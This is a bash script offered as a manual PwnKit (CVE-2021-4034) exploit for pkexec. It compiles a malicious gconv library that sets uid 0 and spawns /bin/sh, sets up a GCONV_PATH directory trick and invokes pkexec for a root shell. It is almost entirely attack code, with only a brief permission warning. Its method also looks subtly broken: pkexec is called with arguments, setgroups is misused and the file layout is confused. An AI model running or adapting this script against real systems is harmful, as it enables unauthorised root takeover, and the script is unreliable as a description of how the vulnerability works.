#!/bin/bash

# PwnKit (CVE-2021-4034) Manual Exploit Script
# Grants an interactive root shell on vulnerable systems
# By trinetra-1308

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${RED}[!] WARNING: This script exploits CVE-2021-4034 (PwnKit)${NC}"
echo -e "${RED}[!] Only use on systems you own or have explicit permission to test${NC}"
echo ""

# Check if already root
if [ "$EUID" -eq 0 ]; then
    echo -e "${YELLOW}[*] Already root. Spawning shell anyway...${NC}"
    /bin/sh
    exit 0
fi

# Check for pkexec
if [ ! -f "/usr/bin/pkexec" ]; then
    echo -e "${RED}[-] pkexec not found${NC}"
    exit 1
fi

if [ ! -u "/usr/bin/pkexec" ]; then
    echo -e "${RED}[-] pkexec is not SUID. System may be patched.${NC}"
    exit 1
fi

echo -e "${GREEN}[+] Found vulnerable pkexec at /usr/bin/pkexec${NC}"
echo ""

# Create working directory
WORK_DIR="/tmp/pwnkit_$$"
mkdir -p "$WORK_DIR"
cd "$WORK_DIR" || exit 1

# Create malicious library
cat > pwnkit.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv() {}
void gconv_init() {
    setuid(0);
    setgid(0);
    setgroups(0);
    // Spawn interactive shell
    execl("/bin/sh", "sh", NULL);
}
EOF

# Compile the malicious library
echo -e "${GREEN}[+] Compiling exploit payload...${NC}"
gcc -shared -fPIC -o pwnkit.so pwnkit.c 2>/dev/null

if [ ! -f "pwnkit.so" ]; then
    echo -e "${RED}[-] Compilation failed. Install gcc: apt install gcc or yum install gcc${NC}"
    cd / && rm -rf "$WORK_DIR"
    exit 1
fi

# Setup gconv
echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules

# Setup GCONV_PATH
mkdir -p "GCONV_PATH=."
cp /usr/bin/true "GCONV_PATH=./pwnkit.so:."

# Set environment
export GCONV_PATH="GCONV_PATH=."
export PATH="$PATH:."
export LC_ALL=en_US.UTF-8

# Trigger exploit - THIS GIVES THE ROOT SHELL
echo -e "${GREEN}[+] Triggering exploit...${NC}"
echo -e "${YELLOW}[*] Attempting to gain root shell...${NC}"
echo ""

# Run pkexec - this will replace the current process with root shell
pkexec --user "$USER" sh -c 'exec /bin/sh' 2>/dev/null

# If we get here, exploit failed
echo -e "${RED}[-] Exploit failed. System is likely patched.${NC}"
cd / && rm -rf "$WORK_DIR"
exit 1